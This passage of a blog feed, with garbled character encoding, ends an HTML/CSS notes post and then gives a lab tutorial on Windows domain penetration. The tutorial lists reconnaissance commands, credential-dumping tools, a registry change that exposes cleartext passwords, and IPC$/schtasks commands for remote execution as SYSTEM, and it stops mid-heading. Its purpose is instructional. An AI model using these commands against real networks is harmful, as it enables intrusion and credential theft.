è¶…å‡ºçš„è¾¹æ¡†</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326214302027.png" alt="image-20220326214302027"></p><p>æ·»åŠ overflowåä¼šå¢åŠ ä¸€ä¸ªæ‹–åŠ¨æ¡</p><h2 id="å®šä½"><a href="#å®šä½" class="headerlink" title="å®šä½"></a>å®šä½</h2><pre><code>positionstaticé™æ€å®šä½ï¼ˆä¸å¯¹å®ƒçš„ä½ç½®è¿›è¡Œæ”¹å˜ï¼Œåœ¨å“ªé‡Œå°±åœ¨é‚£é‡Œï¼‰é»˜è®¤å€¼ã€‚æ²¡æœ‰å®šä½ï¼Œå…ƒç´ å‡ºç°åœ¨æ­£å¸¸çš„æµä¸­ï¼ˆå¿½ç•¥ top,bottom, left, right æˆ–è€…z-index å£°æ˜ï¼‰ã€‚fixedå›ºå®šå®šä½ï¼ˆå‚ç…§ç‰©--æµè§ˆå™¨çª—å£ï¼‰---åš å¼¹çª—å¹¿å‘Šç”¨åˆ°ç”Ÿæˆå›ºå®šå®šä½çš„å…ƒç´ ï¼Œç›¸å¯¹äºæµè§ˆå™¨çª—å£è¿›è¡Œå®šä½ã€‚ å…ƒç´ çš„ä½ç½®é€šè¿‡ &quot;left&quot;, &quot;top&quot;, &quot;right&quot;ä»¥åŠ &quot;bottom&quot;å±æ€§è¿›è¡Œè§„å®šã€‚relativeï¼ˆç›¸å¯¹å®šä½ ï¼‰ï¼ˆå‚ç…§ç‰©ä»¥ä»–æœ¬èº«ï¼‰ç”Ÿæˆç›¸å¯¹å®šä½çš„å…ƒç´ ï¼Œç›¸å¯¹äºå…¶æ­£å¸¸ä½ç½®è¿›è¡Œå®šä½ã€‚absoluteï¼ˆç»å¯¹å®šä½ï¼‰(é™¤äº†staticéƒ½å¯ä»¥ï¼Œæ‰¾åˆ°å‚ç…§ç‰©--&gt;ä¸å®ƒæœ€è¿‘çš„å·²ç»æœ‰å®šä½çš„çˆ¶å…ƒç´ è¿›è¡Œå®šä½)ç”Ÿæˆç»å¯¹å®šä½çš„å…ƒç´ ï¼Œç›¸å¯¹äº static å®šä½ä»¥å¤–çš„ç¬¬ä¸€ä¸ªçˆ¶å…ƒç´ è¿›è¡Œå®šä½ã€‚å…ƒç´ çš„ä½ç½®é€šè¿‡ &quot;left&quot;, &quot;top&quot;, &quot;right&quot; ä»¥åŠ &quot;bottom&quot; å±æ€§è¿›è¡Œè§„å®šz-indexz-index å±æ€§è®¾ç½®å…ƒç´ çš„å †å é¡ºåºã€‚æ‹¥æœ‰æ›´é«˜å †å é¡ºåºçš„å…ƒç´ æ€»æ˜¯ä¼šå¤„äºå †å é¡ºåºè¾ƒä½çš„å…ƒç´ çš„å‰é¢ã€‚å®šä½çš„åŸºæœ¬æ€æƒ³: å®ƒå…è®¸ä½ å®šä¹‰å…ƒç´ æ¡†ç›¸å¯¹äºå…¶æ­£å¸¸ä½ç½®åº”è¯¥å‡ºç°çš„ä½ç½®ï¼Œæˆ–è€…ç›¸å¯¹äºçˆ¶å…ƒç´ ã€å¦ä¸€ä¸ªå…ƒç´ ç”šè‡³æµè§ˆå™¨çª—å£æœ¬èº«çš„ä½ç½®ã€‚</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220327005012845.png" alt="image-20220327005012845"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;ç®€å•çš„HTMLé¡µé¢æ¶æ„&quot;&gt;&lt;a href=&quot;#ç®€å•çš„HTMLé¡µé¢æ¶æ„&quot; class=&quot;headerlink&quot; title=&quot;ç®€å•çš„HTMLé¡µé¢æ¶æ„&quot;&gt;&lt;/a&gt;ç®€å•çš„HTMLé¡µé¢æ¶æ„&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;</summary>
      
    
    
    
    <category term="è¯­è¨€" scheme="https://sakurahack-y.github.io/categories/%E8%AF%AD%E8%A8%80/"/>
    
    <category term="html" scheme="https://sakurahack-y.github.io/categories/%E8%AF%AD%E8%A8%80/html/"/>
    
    
    <category term="html" scheme="https://sakurahack-y.github.io/tags/html/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘æ¸—é€ç¯‡</title>
    <link href="https://sakurahack-y.github.io/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/"/>
    <id>https://sakurahack-y.github.io/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/</id>
    <published>2022-03-18T06:56:01.000Z</published>
    <updated>2022-03-31T16:30:08.477Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="åŸŸçš„æ­å»º"><a href="#åŸŸçš„æ­å»º" class="headerlink" title="åŸŸçš„æ­å»º"></a>åŸŸçš„æ­å»º</h1><p>å®éªŒç¯å¢ƒ:</p><p>win2008 åŸŸæ§       æœ¬åœ°ç®¡ç†å‘˜å¯†ç :0801.com  åŸŸå¯†ç :yk2008.com    ip:192.168.137.2     </p><p>win 2008 åŸŸæˆå‘˜  æœ¬åœ°ç®¡ç†å‘˜å¯†ç :0802.com  åŸŸå¯†ç :yc2008.com    ip:192.168.137.66</p><p>win 2003 åŸŸæˆå‘˜  æœ¬åœ°ç®¡ç†å‘˜å¯†ç :0301.com  åŸŸå¯†ç : yc2003.com    ip:192.168.137.99</p><p><strong>é…ç½®åŸŸæ§2008</strong></p><p>ä½¿ç”¨vm1ç½‘å¡</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141739390.png" alt="image-20220322141739390"></p><p>é…ç½®ip</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141649714.png" alt="image-20220322141649714"></p><p>æ‰¾åˆ°æœåŠ¡å™¨ç®¡ç†å™¨</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322135655066.png" alt="image-20220322135655066"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322135624657.png" alt="image-20220322135624657"></p><p>ä¸€ç›´ä¸‹ä¸€æ­¥ï¼Œç„¶åå®‰è£…</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322140010325.png" alt="image-20220322140010325"></p><p>å®‰è£…æˆåŠŸ</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322140057795.png" alt="image-20220322140057795"></p><p>è¿è¡Œdcpromoç¨‹åº:</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141947512.png" alt="image-20220322141947512"></p><p>ä¸€ç›´ä¸‹ä¸€æ­¥ï¼Œåˆ°è¿™é‡Œæ–°å»ºåŸŸ</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142110877.png" alt="image-20220322142110877"></p><p>å‘½åæ—æ ¹åŸŸ</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142158498.png" alt="image-20220322142158498"></p><p>é€‰æ‹©2008 R2</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142302851.png" alt="image-20220322142302851"></p><p>ä¸€ç›´ä¸‹ä¸€æ­¥/é»˜è®¤æ˜¯ï¼Œåˆ°è¿™ä¸€æ­¥è®¾ç½®å¯†ç ä¸º:yk2008.com</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142632261.png" alt="image-20220322142632261"></p><p>ä¸€ç›´ä¸‹ä¸€æ­¥</p><p>å®Œæˆäº†åŸŸæ§çš„é…ç½®ï¼Œå¹¶é‡å¯</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142812609.png" alt="image-20220322142812609"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142833978.png" alt="image-20220322142833978"></p><p>é‡å¯åï¼Œæœ‰åŸŸçš„æ ‡è¯†å‡ºç°ï¼Œæˆ‘ä»¬ä½¿ç”¨å‰æ–‡è®¾ç½®çš„åŸŸæ§å¯†ç ç™»å½•</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322143248873.png" alt="image-20220322143248873"></p><p>è¿›å…¥å</p><p>æ‰“å¼€åŸŸç®¡ç†ä¸­å¿ƒ</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322150310596.png" alt="image-20220322150310596"></p><p>æ‰“å¼€ç”¨æˆ·å’Œè®¡ç®—æœºï¼Œæ–°å»ºç»„ç»‡hack</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151545759.png" alt="image-20220322151545759"></p><p>åœ¨è¿™ä¸ªç»„åˆ†åˆ«å»ºç«‹server2003ç”¨æˆ·å’Œserver2008ç”¨æˆ·ï¼Œè®¾ç½®åŸŸå¯†ç åˆ†åˆ«ä¸º yc2003.comå’Œyc2008.com</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151809690.png" alt="image-20220322151809690"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151918916.png" alt="image-20220322151918916"></p><p>åˆ°è¿™é‡ŒåŸŸæ§çš„é…ç½®å°±å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥å°±è®©åŸŸæˆå‘˜åŠ å…¥åŸŸ</p><p>è¿›å…¥windows2003</p><p>æ›´æ”¹è®¡ç®—æœºååŠ å…¥åŸŸ</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322153432998.png" alt="image-20220322153432998"></p><p>windows2008åŒç†</p><p>ç„¶åé‡å¯</p><p>è¾“å…¥åŠ å…¥åŸŸçš„è®¡ç®—æœºå</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154303764.png" alt="image-20220322154303764"></p><p>æˆåŠŸç™»å…¥</p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154329618.png" alt="image-20220322154329618" style="zoom:50%;"><p>æˆ‘ä»¬åœ¨åŸŸæ§ä¸­å°±èƒ½çœ‹åˆ°ä¸¤å°è®¡ç®—æœºä¸Šçº¿</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154709810.png" alt="image-20220322154709810"></p><p>åŸŸç¯å¢ƒå°±æ­å»ºå¥½äº†</p><h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><p><strong>åŸºæœ¬ä¿¡æ¯æ”¶é›†ï¼š</strong></p><p>äº†è§£å½“å‰æœåŠ¡å™¨çš„è®¡ç®—æœºåŸºæœ¬ä¿¡æ¯ï¼Œä¸ºåç»­åˆ¤æ–­æœåŠ¡å™¨è§’è‰²ï¼Œç½‘ç»œç¯å¢ƒç­‰åšå‡†å¤‡</p><pre><code>systeminfo è¯¦ç»†ä¿¡æ¯net start å¯åŠ¨æœåŠ¡tasklist è¿›ç¨‹åˆ—è¡¨schtasks è®¡åˆ’ä»»åŠ¡</code></pre><p><strong>ç½‘ç»œä¿¡æ¯æ”¶é›†:</strong></p><p>äº†è§£å½“å‰æœåŠ¡å™¨çš„ç½‘ç»œæ¥å£ä¿¡æ¯ï¼Œä¸ºåˆ¤æ–­å½“å‰è§’è‰²ï¼ŒåŠŸèƒ½ï¼Œç½‘ç»œæ¶æ„åšå‡†å¤‡</p><pre><code>ipconfig /all åˆ¤æ–­å­˜åœ¨åŸŸ-dnsnet view /domain åˆ¤æ–­å­˜åœ¨åŸŸnet time /domain åˆ¤æ–­ä¸»åŸŸnetstat -ano å½“å‰ç½‘ç»œç«¯å£å¼€æ”¾nslookup åŸŸå è¿½è¸ªæ¥æºåœ°å€</code></pre><p><strong>ç”¨æˆ·ä¿¡æ¯æ”¶é›†:</strong></p><p>äº†è§£å½“å‰è®¡ç®—æœºæˆ–åŸŸç¯å¢ƒä¸‹çš„ç”¨æˆ·åŠç”¨æˆ·ç»„ä¿¡æ¯ï¼Œä¾¿äºåæœŸåˆ©ç”¨å‡­æ®è¿›è¡Œæµ‹è¯•</p><pre><code>Domain Adminsï¼šåŸŸç®¡ç†å‘˜ï¼ˆé»˜è®¤å¯¹åŸŸæ§åˆ¶å™¨æœ‰å®Œå…¨æ§åˆ¶æƒï¼‰Domain Computersï¼šåŸŸå†…æœºå™¨Domain Controllersï¼šåŸŸæ§åˆ¶å™¨Domain Guestï¼šåŸŸè®¿å®¢ï¼Œæƒé™ä½Domain Usersï¼šåŸŸç”¨æˆ·Enterprise Adminsï¼šä¼ä¸šç³»ç»Ÿç®¡ç†å‘˜ç”¨æˆ·ï¼ˆé»˜è®¤å¯¹åŸŸæ§åˆ¶å™¨æœ‰å®Œå…¨æ§åˆ¶æƒï¼‰ç›¸å…³ç”¨æˆ·æ”¶é›†æ“ä½œå‘½ä»¤ï¼šwhoami /all ç”¨æˆ·æƒé™net config workstation ç™»å½•ä¿¡æ¯net user æœ¬åœ°ç”¨æˆ·net localgroup æœ¬åœ°ç”¨æˆ·ç»„net user /domain è·å–åŸŸç”¨æˆ·ä¿¡æ¯net group /domain è·å–åŸŸç”¨æˆ·ç»„ä¿¡æ¯wmic useraccount get /all æ¶‰åŠåŸŸç”¨æˆ·è¯¦ç»†ä¿¡æ¯net group &quot;Domain Admins&quot; /domain æŸ¥è¯¢åŸŸç®¡ç†å‘˜è´¦æˆ·net group &quot;Enterprise Admins&quot; /domain æŸ¥è¯¢ç®¡ç†å‘˜ç”¨æˆ·ç»„net group &quot;Domain Controllers&quot; /domain æŸ¥è¯¢åŸŸæ§åˆ¶å™¨</code></pre><p><strong>å‡­æ®ä¿¡æ¯æ”¶é›†æ“ä½œ:</strong></p><p>æ”¶é›†å„ç§å¯†æ–‡ï¼Œæ˜æ–‡ï¼Œå£ä»¤ç­‰ï¼Œä¸ºåç»­æ¨ªå‘æ¸—é€åšå¥½æµ‹è¯•å‡†å¤‡</p><pre><code>è®¡ç®—æœºç”¨æˆ· HASHï¼Œæ˜æ–‡è·å–-mimikatz(win)ï¼Œmimipenguin(linux)è®¡ç®—æœºå„ç§åè®®æœåŠ¡å£ä»¤è·å–-LaZagne(all)ï¼ŒXenArmor(win)Netsh WLAN show profilesNetsh WLAN show profile name=&quot;æ— çº¿åç§°&quot; key=clear1.ç«™ç‚¹æºç å¤‡ä»½æ–‡ä»¶ã€æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ç­‰2.å„ç±»æ•°æ®åº“ Web ç®¡ç†å…¥å£ï¼Œå¦‚ PHPMyAdmin3.æµè§ˆå™¨ä¿å­˜å¯†ç ã€æµè§ˆå™¨ Cookies4.å…¶ä»–ç”¨æˆ·ä¼šè¯ã€3389 å’Œ ipc$è¿æ¥è®°å½•ã€å›æ”¶ç«™å†…å®¹5.Windows ä¿å­˜çš„ WIFI å¯†ç 6.ç½‘ç»œå†…éƒ¨çš„å„ç§å¸å·å’Œå¯†ç ï¼Œå¦‚ï¼šEmailã€VPNã€FTPã€OA ç­‰</code></pre><p><strong>æ¢é’ˆä¸»æœºåŸŸæ§æ¶æ„æœåŠ¡:</strong></p><p>ä¸ºåç»­æ¨ªå‘æ€è·¯åšå‡†å¤‡ï¼Œé’ˆå¯¹åº”ç”¨ï¼Œåè®®ç­‰å„ç±»æ”»å‡»æ‰‹æ³•</p><pre><code>æ¢é’ˆåŸŸæ§åˆ¶å™¨ååŠåœ°å€ä¿¡æ¯net time /domain nslookup pingæ¢é’ˆåŸŸå†…å­˜æ´»ä¸»æœºåŠåœ°å€ä¿¡æ¯nbtscan 192.168.3.0/24 ç¬¬ä¸‰æ–¹å·¥å…·for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot; è‡ªå¸¦å†…éƒ¨å‘½ä»¤nmap masscan ç¬¬ä¸‰æ–¹ PowerShell è„šæœ¬ nishang empire ç­‰#å¯¼å…¥æ¨¡å— nishangImport-Module .\nishang.psm1#è®¾ç½®æ‰§è¡Œç­–ç•¥Set-ExecutionPolicy RemoteSigned#è·å–æ¨¡å— nishang çš„å‘½ä»¤å‡½æ•°Get-Command -Module nishang#è·å–å¸¸è§„è®¡ç®—æœºä¿¡æ¯Get-Information#ç«¯å£æ‰«æï¼ˆæŸ¥çœ‹ç›®å½•å¯¹åº”æ–‡ä»¶æœ‰æ¼”ç¤ºè¯­æ³•ï¼Œå…¶ä»–åŒç†ï¼‰Invoke-PortScan -StartAddress 192.168.3.0 -EndAddress 192.168.3.100 -ResolveHost -ScanPort#å…¶ä»–åŠŸèƒ½ï¼šåˆ é™¤è¡¥ä¸ï¼Œåå¼¹ Shellï¼Œå‡­æ®è·å–ç­‰æ¢é’ˆåŸŸå†…ä¸»æœºè§’è‰²åŠæœåŠ¡ä¿¡æ¯åˆ©ç”¨å¼€æ”¾ç«¯å£æœåŠ¡åŠè®¡ç®—æœºååˆ¤æ–­æ ¸å¿ƒä¸šåŠ¡æœºå™¨:1.é«˜çº§ç®¡ç†äººå‘˜ã€ç³»ç»Ÿç®¡ç†å‘˜ã€è´¢åŠ¡/äººäº‹/ä¸šåŠ¡äººå‘˜çš„ä¸ªäººè®¡ç®—æœº2.äº§å“ç®¡ç†ç³»ç»ŸæœåŠ¡å™¨3.åŠå…¬ç³»ç»ŸæœåŠ¡å™¨4.è´¢åŠ¡åº”ç”¨ç³»ç»ŸæœåŠ¡å™¨5.æ ¸å¿ƒäº§å“æºç æœåŠ¡å™¨ï¼ˆè‡ªå»º SVNã€GITï¼‰6.æ•°æ®åº“æœåŠ¡å™¨7.æ–‡ä»¶æˆ–ç½‘ç›˜æœåŠ¡å™¨ã€å…±äº«æœåŠ¡å™¨8.ç”µå­é‚®ä»¶æœåŠ¡å™¨9.ç½‘ç»œç›‘æ§ç³»ç»ŸæœåŠ¡å™¨10.å…¶ä»–æœåŠ¡å™¨ï¼ˆå†…éƒ¨æŠ€æœ¯æ–‡æ¡£æœåŠ¡å™¨ã€å…¶ä»–ç›‘æ§æœåŠ¡å™¨ç­‰ï¼‰</code></pre><h1 id="åŸŸæ¨ªå‘"><a href="#åŸŸæ¨ªå‘" class="headerlink" title="åŸŸæ¨ªå‘"></a>åŸŸæ¨ªå‘</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/1b22fbb60e7aa3f167c08e67c61e025e73769fd3.png@942w_611h_progressive.webp" alt="img"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320150741924.png" alt="image-20220320150741924"></p><h2 id="åŸŸæ¨ªå‘å¿…å¤‡çŸ¥è¯†ç‚¹"><a href="#åŸŸæ¨ªå‘å¿…å¤‡çŸ¥è¯†ç‚¹" class="headerlink" title="åŸŸæ¨ªå‘å¿…å¤‡çŸ¥è¯†ç‚¹"></a><strong>åŸŸæ¨ªå‘å¿…å¤‡çŸ¥è¯†ç‚¹</strong></h2><p><strong>çŸ¥è¯†ç‚¹1ï¼š</strong><br>Windows2012ä»¥ä¸Šç‰ˆæœ¬é»˜è®¤å…³é—­wdigest,æ”»å‡»è€…æ— æ³•ä»å†…å­˜ä¸­è·å–æ˜æ–‡å¯†ç <br>Windows2012ä»¥ä¸‹ç‰ˆæœ¬å¦‚å®‰è£…KB2871997è¡¥ä¸ï¼ŒåŒæ ·ä¹Ÿä¼šå¯¼è‡´æ— æ³•è·å–æ˜æ–‡å¯†ç </p><pre><code>é’ˆå¯¹ä»¥ä¸Šæƒ…å†µï¼Œæˆ‘ä»¬æä¾›äº†4ç§æ–¹å¼è§£å†³æ­¤ç±»é—®é¢˜1.åˆ©ç”¨å“ˆå¸Œ hash ä¼ é€’(pthï¼Œptkç­‰)è¿›è¡Œç§»åŠ¨2.åˆ©ç”¨å…¶å®ƒæœåŠ¡åè®®(SMB,WMIç­‰)è¿›è¡Œå“ˆå¸Œç§»åŠ¨3.åˆ©ç”¨æ³¨å†Œè¡¨æ“ä½œå¼€å¯Wdigest Authå€¼è¿›è¡Œè·å–4.åˆ©ç”¨å·¥å…·æˆ–ç¬¬ä¸‰æ–¹å¹³å°(Hachcat)è¿›è¡Œç ´è§£è·å–</code></pre><pre><code>#æ³¨å†Œè¡¨æ“ä½œå¼€å¯Wdigest Authå€¼reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><p><strong>çŸ¥è¯†ç‚¹2ï¼š</strong><br>Windowsç³»ç»ŸLM HashåŠNTLM HashåŠ å¯†ç®—æ³•ï¼Œä¸ªäººç³»ç»Ÿåœ¨Windows vistaåï¼ŒæœåŠ¡å™¨ç³»ç»Ÿåœ¨Windows 2003ä»¥åï¼Œè®¤è¯æ–¹å¼å‡ä¸ºNTLM Hashã€‚</p><pre><code>#è·å–winå¯†ç hashçš„ä¸¤ä¸ªå·¥å…·Pwdump7QuarksPwdump</code></pre><p><strong>çŸ¥è¯†ç‚¹3ï¼š</strong><br>åŸŸç”¨æˆ·ä¸æœ¬åœ°ç”¨æˆ·çš„åŒºåˆ«<br>æ¯”å¦‚ï¼Œ<code>god/administrator</code>æ˜¯åŸŸç”¨æˆ·ï¼Œ<code>./administrator</code>æ˜¯æœ¬åœ°ç”¨æˆ·</p><h2 id="at-amp-amp-schtasks-å¯†ç æ˜¯æ˜æ–‡"><a href="#at-amp-amp-schtasks-å¯†ç æ˜¯æ˜æ–‡" class="headerlink" title="at&amp;&amp;schtasks(å¯†ç æ˜¯æ˜æ–‡)"></a><strong>at&amp;&amp;schtasks(å¯†ç æ˜¯æ˜æ–‡)</strong></h2><p><strong>ä¼˜ç‚¹:å®˜æ–¹è‡ªå¸¦å‘½ä»¤ï¼Œä¸ä¼šè¢«æ€</strong></p><p><strong>ç¼ºç‚¹:å‘½ä»¤æ¯”è¾ƒç¹çï¼Œä¸”åªæ”¯æŒæ˜æ–‡å¯†ç </strong></p><p>åœ¨æ‹¿ä¸‹ä¸€å°å†…ç½‘ä¸»æœºåï¼Œé€šè¿‡æœ¬åœ°ä¿¡æ¯æœé›†æ”¶é›†ç”¨æˆ·å‡­è¯ç­‰ä¿¡æ¯åï¼Œå¦‚ä½•æ¨ªå‘æ¸—é€æ‹¿ä¸‹æ›´å¤šçš„ä¸»æœºï¼Ÿ è¿™é‡Œä»‹ç» at&amp;schtasks å‘½ä»¤çš„ä½¿ç”¨ï¼Œåœ¨å·²çŸ¥ç›®æ ‡ç³»ç»Ÿçš„ç”¨æˆ·æ˜æ–‡å¯†ç çš„åŸºç¡€ä¸Šï¼Œç›´æ¥å¯ä»¥åœ¨è¿œç¨‹ä¸» æœºä¸Šæ‰§è¡Œå‘½ä»¤</p><p>è·å–åˆ°æŸåŸŸä¸»æœºæƒé™â€“&gt;minikatz å¾—åˆ°å¯†ç ï¼ˆæ˜æ–‡ï¼Œhashï¼‰â€“&gt;ç”¨åˆ°ä¿¡æ¯æ”¶é›†é‡Œé¢åŸŸç”¨æˆ·çš„åˆ—è¡¨å½“åšç”¨æˆ·åå­—å…¸-&gt;ç”¨åˆ°å¯†ç æ˜æ–‡å½“åšå¯†ç å­—å…¸â€“&gt;å°è¯•è¿æ¥â€“&gt;åˆ›å»ºè®¡åˆ’ä»»åŠ¡(at|schtasks)â€“&gt;æ‰§è¡Œæ–‡ä»¶å¯ä¸ºåé—¨æˆ–è€…ç›¸å…³å‘½ä»¤</p><p>åˆ©ç”¨æµç¨‹:</p><ol><li>å»ºç«‹ IPC é“¾æ¥åˆ°ç›®æ ‡ä¸»æœº (ç›®æ ‡ä¸»æœºè¦å¼€å¯135ï¼Œ445)</li><li> æ‹·è´è¦æ‰§è¡Œçš„å‘½ä»¤è„šæœ¬åˆ°ç›®æ ‡ä¸»æœº </li><li>æŸ¥çœ‹ç›®æ ‡æ—¶é—´ï¼Œåˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼ˆatã€schtasksï¼‰å®šæ—¶æ‰§è¡Œæ‹·è´åˆ°çš„è„šæœ¬ </li><li> åˆ é™¤ IPC é“¾æ¥ </li></ol><pre><code>net use \\server\ipc$&quot;password&quot; /user:username # å·¥ä½œç»„ net use \\server\ipc$&quot;password&quot; /user:domain\username #åŸŸå†… dir \\xx.xx.xx.xx\C$\ # æŸ¥çœ‹æ–‡ä»¶åˆ—è¡¨ copy \\xx.xx.xx.xx\C$\1.bat 1.bat # ä¸‹è½½æ–‡ä»¶ copy 1.bat \\xx.xx.xx.xx\C$ # å¤åˆ¶æ–‡ä»¶ net use \\xx.xx.xx.xx\C$\1.bat /del # åˆ é™¤ IPC net view xx.xx.xx.xx # æŸ¥çœ‹å¯¹æ–¹å…±äº« #å»ºç«‹ IPC å¸¸è§çš„é”™è¯¯ä»£ç  ï¼ˆ1ï¼‰5ï¼šæ‹’ç»è®¿é—®ï¼Œå¯èƒ½æ˜¯ä½¿ç”¨çš„ç”¨æˆ·ä¸æ˜¯ç®¡ç†å‘˜æƒé™ï¼Œéœ€è¦å…ˆæå‡æƒé™ ï¼ˆ2ï¼‰51ï¼šç½‘ç»œé—®é¢˜ï¼ŒWindows æ— æ³•æ‰¾åˆ°ç½‘ç»œè·¯å¾„ ï¼ˆ3ï¼‰53ï¼šæ‰¾ä¸åˆ°ç½‘ç»œè·¯å¾„ï¼Œå¯èƒ½æ˜¯ IP åœ°å€é”™è¯¯ã€ç›®æ ‡æœªå¼€æœºã€ç›®æ ‡ Lanmanserver æœåŠ¡æœªå¯åŠ¨ã€æœ‰ é˜²ç«å¢™ç­‰é—®é¢˜ ï¼ˆ4ï¼‰67ï¼šæ‰¾ä¸åˆ°ç½‘ç»œåï¼Œæœ¬åœ° Lanmanworkstation æœåŠ¡æœªå¯åŠ¨ï¼Œç›®æ ‡åˆ é™¤ ipc$ ï¼ˆ5ï¼‰1219ï¼šæä¾›çš„å‡­æ®å’Œå·²å­˜åœ¨çš„å‡­æ®é›†å†²çªï¼Œè¯´æ˜å·²å»ºç«‹ IPC$ï¼Œéœ€è¦å…ˆåˆ é™¤ ï¼ˆ6ï¼‰1326ï¼šè´¦å·å¯†ç é”™è¯¯ ï¼ˆ7ï¼‰1792ï¼šç›®æ ‡ NetLogon æœåŠ¡æœªå¯åŠ¨ï¼Œè¿æ¥åŸŸæ§å¸¸å¸¸ä¼šå‡ºç°æ­¤æƒ…å†µ ï¼ˆ8ï¼‰2242ï¼šç”¨æˆ·å¯†ç è¿‡æœŸï¼Œç›®æ ‡æœ‰è´¦å·ç­–ç•¥ï¼Œå¼ºåˆ¶å®šæœŸæ›´æ”¹å¯†ç  #å»ºç«‹ IPC å¤±è´¥çš„åŸå›  ï¼ˆ1ï¼‰ç›®æ ‡ç³»ç»Ÿä¸æ˜¯ NT æˆ–ä»¥ä¸Šçš„æ“ä½œç³»ç»Ÿ ï¼ˆ2ï¼‰å¯¹æ–¹æ²¡æœ‰æ‰“å¼€ IPC$å…±äº« ï¼ˆ3ï¼‰å¯¹æ–¹æœªå¼€å¯ 139ã€445 ç«¯å£ï¼Œæˆ–è€…è¢«é˜²ç«å¢™å±è”½ ï¼ˆ4ï¼‰è¾“å‡ºå‘½ä»¤ã€è´¦å·å¯†ç æœ‰é”™è¯¯</code></pre><pre><code>[at] &amp; [schtasks]#at &lt; Windows2012net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # å»ºç«‹ ipc è¿æ¥ï¼šcopy add.bat \\192.168.3.21\c$ #æ‹·è´æ‰§è¡Œæ–‡ä»¶åˆ°ç›®æ ‡æœºå™¨at \\192.168.3.21 15:47 c:\add.bat #æ·»åŠ è®¡åˆ’ä»»åŠ¡#schtasks &gt;=Windows2012net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\administrator # å»ºç«‹ ipc è¿æ¥ï¼šcopy add.bat \\192.168.3.32\c$ #å¤åˆ¶æ–‡ä»¶åˆ°å…¶ C ç›˜schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F #åˆ›å»º adduser ä»»åŠ¡å¯¹åº”æ‰§è¡Œæ–‡ä»¶schtasks /run /s 192.168.3.32 /tn adduser /i #è¿è¡Œ adduser ä»»åŠ¡schtasks /delete /s 192.168.3.21 /tn adduser /f#åˆ é™¤ adduser ä»»åŠ¡</code></pre><h2 id="atexec-impacket-æ˜æ–‡å’ŒHASH-ä¼ é€’æ”»å‡»"><a href="#atexec-impacket-æ˜æ–‡å’ŒHASH-ä¼ é€’æ”»å‡»" class="headerlink" title="atexec-impacket æ˜æ–‡å’ŒHASH ä¼ é€’æ”»å‡»"></a><strong>atexec-impacket 